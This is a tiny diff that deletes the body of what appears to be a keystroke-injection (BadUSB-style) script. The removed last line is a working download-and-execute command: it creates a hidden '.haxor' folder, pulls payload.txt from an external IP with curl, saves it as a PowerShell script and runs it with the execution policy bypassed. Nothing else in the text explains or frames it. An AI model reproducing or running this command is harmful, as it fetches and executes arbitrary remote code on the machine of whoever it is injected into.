@@ -1,5 +1,0 @@
-DELAY
-ADELAY
-DELAY
-DELAY
-cd / & mkdir .haxor & cd .haxor & echo (curl -X GET  http://34.240.44.38/payload.txt) > file.PS1 & powershell -ExecutionPolicy ByPass -File file.ps1DELAY
